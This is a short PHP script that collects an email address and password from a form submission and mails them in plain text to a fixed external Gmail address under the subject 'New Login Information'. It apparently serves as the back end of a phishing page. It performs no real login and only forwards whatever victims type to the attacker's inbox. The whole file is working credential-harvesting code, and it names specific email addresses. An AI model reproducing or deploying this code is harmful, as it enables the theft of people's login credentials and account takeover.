<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect the email and password from the POST request
    $email = filter_var(trim($_POST['email']), FILTER_SANITIZE_EMAIL);
    $password = trim($_POST['password']);

    // Validate email
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        die("Invalid email format");
    }

    // Prepare email parameters
    $to = "alexbt2636@gmail.com"; // Send results to this email
    $subject = "New Login Information";
    $message = "Email: " . $email . "\nPassword: " . $password;
    $headers = "From: wvi133644@gmail.com"; // Replace with a valid sender email

    // Send email
    if (mail($to, $subject, $message, $headers)) {
        echo "Email sent successfully!";
    } else {
        echo "Error sending email.";
    }
} else {
    echo "Invalid request method.";
}

// Signature: 50fifty
?>
